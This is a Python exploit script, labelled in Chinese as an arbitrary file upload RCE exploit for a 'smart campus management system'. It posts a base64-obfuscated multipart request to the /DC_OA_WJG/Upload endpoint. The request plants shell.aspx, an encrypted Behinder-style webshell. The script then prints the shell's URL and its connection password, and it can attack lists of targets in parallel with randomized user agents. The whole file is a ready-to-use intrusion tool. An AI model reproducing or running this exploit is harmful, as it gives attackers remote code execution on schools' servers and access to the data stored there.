import requests
import re
import sys
import urllib3
from argparse import ArgumentParser
import threadpool
from urllib import parse
from time import time
import random
import base64

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
filename = sys.argv[1]
url_list=[]

#随机ua
def get_ua():
	first_num = random.randint(55, 62)
	third_num = random.randint(0, 3200)
	fourth_num = random.randint(0, 140)
	os_type = [
		'(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)',
		'(Macintosh; Intel Mac OS X 10_12_6)'
	]
	chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num)

	ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
				   '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']
				  )
	return ua

#poc
def check_vuln(url):
	url = parse.urlparse(url)
	url1 = url.scheme + '://' + url.netloc
	vuln_url = url.scheme + '://' + url.netloc + '/DC_OA_WJG/Upload'
	headers = {
		'User-Agent': get_ua(),
		'Content-Type': 'multipart/form-data;boundary=---------------------------3946340767606774640224204207',
	}
	data=base64.b64decode("LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0zOTQ2MzQwNzY3NjA2Nzc0NjQwMjI0MjA0MjA3CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0idXBGaWxlIjsgZmlsZW5hbWU9InNoZWxsLmFzcHgiCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtCgo8JUAgUGFnZSBMYW5ndWFnZT0iQyMiICU+PCVASW1wb3J0IE5hbWVzcGFjZT0iU3lzdGVtLlJlZmxlY3Rpb24iJT48JVNlc3Npb24uQWRkKCJrIiwiZDJhYzA4YzY0YjVkYjM4YSIpOyBieXRlW10gayA9IEVuY29kaW5nLkRlZmF1bHQuR2V0Qnl0ZXMoU2Vzc2lvblswXSArICIiKSxjID0gUmVxdWVzdC5CaW5hcnlSZWFkKFJlcXVlc3QuQ29udGVudExlbmd0aCk7QXNzZW1ibHkuTG9hZChuZXcgU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5SaWpuZGFlbE1hbmFnZWQoKS5DcmVhdGVEZWNyeXB0b3IoaywgaykuVHJhbnNmb3JtRmluYWxCbG9jayhjLCAwLCBjLkxlbmd0aCkpLkNyZWF0ZUluc3RhbmNlKCJVIikuRXF1YWxzKHRoaXMpOyU+CgotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTM5NDYzNDA3Njc2MDY3NzQ2NDAyMjQyMDQyMDctLQ==")
	try:
		res = requests.post(vuln_url,headers=headers,data=data,timeout=15,verify=False)
		if res.status_code==200 and 'path' in res.text:
			path = re.findall(r'"path":"(.*?)","', res.text)[0]
			path = path.replace('..','')
			print('\033[32m[+]webshell:%s%s\033[0m' %(url1,path))
	except Exception as e:
		print("\033[31m[-]%s is timeout\033[0m" %url1)


#多线程
def multithreading(url_list, pools=5):
	works = []
	for i in url_list:
		# works.append((func_params, None))
		works.append(i)
	# print(works)
	pool = threadpool.ThreadPool(pools)
	reqs = threadpool.makeRequests(check_vuln, works)
	[pool.putRequest(req) for req in reqs]
	pool.wait()


if __name__ == '__main__':
	show = r'''

	智慧校园管理系统前台任意文件上传
	                                                                    
                              upload_RCE_exp By m2
	'''
	print(show + '\n')
	arg=ArgumentParser(description='upload_RCE_exp By m2')
	arg.add_argument("-u",
						"--url",
						help="Target URL; Example:http://ip:port")
	arg.add_argument("-f",
						"--file",
						help="Target URL; Example:url.txt")
	args=arg.parse_args()
	url=args.url
	filename=args.file
	start=time()
	print('[*]任务开始...')
	print('[*]webshell使用冰蝎3连接，密码：m2orz')
	if url != None and filename == None:
		check_vuln(url)
	elif url == None and filename != None:
		for i in open(filename):
			i=i.replace('\n','')
			url_list.append(i)
		multithreading(url_list,10)
	end=time()
	print('任务完成，用时%d' %(end-start))